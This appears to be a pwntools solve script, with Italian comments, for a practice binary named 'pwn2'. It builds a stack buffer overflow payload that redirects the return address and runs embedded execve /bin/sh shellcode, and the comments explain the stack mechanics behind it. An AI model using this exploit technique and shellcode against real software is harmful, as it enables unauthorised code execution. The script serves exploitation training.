#   idea è:
#   riempio il buffer, stacco overflOwO sopra all'indirizzo
#   dei ritorno del main per far eseguire la funzione lol

from pwn import *

#                           indirizzo lol
# inp = b"A"*32 + b"B"*12 + p32(0x08048541)
# print(inp)

# with process("pwn2") as bubumilano:
#     bubumilano.recvuntil("$ ")
#     bubumilano.sendline(inp)
#     bubumilano.interactive()

#   passo 2 riempio il buffer con uno shellcraft, cosi quando il main 
#   con il ritorno esegue lol, lol esegue dall'indirizzo del primo
#   elemento del buffer e mi esegue lo shellcraft

shellcode = b"\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68"

inp = b"A"*32 + b"B"*12 + p32(0x08048541) + shellcode

#   metto lo shellcode dopo PERCHE
#   quando esegue leave prima del return in main, leave "pulisce" lo stack frame di main
#   e quindi elimina le variabili, tra cui buffer che conteneva lo shellcode.
#   $esp viene quindi alzato e non punta più al primo elemento del buffer SIGFAULTANDO MALE
#   return poppa un valore dello stack e abbassa ancora $esp.
#   se andiamo a stackoverfloware lo shellcode dopo l'indirizzo di ritorno, $esp punta proprio a quello
#   andandolo ad eseguire senza se e senza ma

open("a", "wb").write(inp)

with process("pwn2") as bubumilano:
    bubumilano.recvuntil("$ ")
    bubumilano.sendline(inp)
    bubumilano.interactive()



#ATTENZIONE: la funzione lol pusha $ebp, quindi andrebbe ad eseguire le ultime 4 BBBB di padding....
#si sistema mettendo 4 NOP al posto delle BBBB oppure i primi 4 byte dello shellcode
# a culo usando BBBB, B è l'istruzione      inc edx
# quindi funziona perche lo fa 4 volte ma chissene frega AHAHAHAHAHAH LMAO
    
#OPPURE jumpo a JMP 0x8048544 (lol+3), (vedo nello disassembly di lol) 
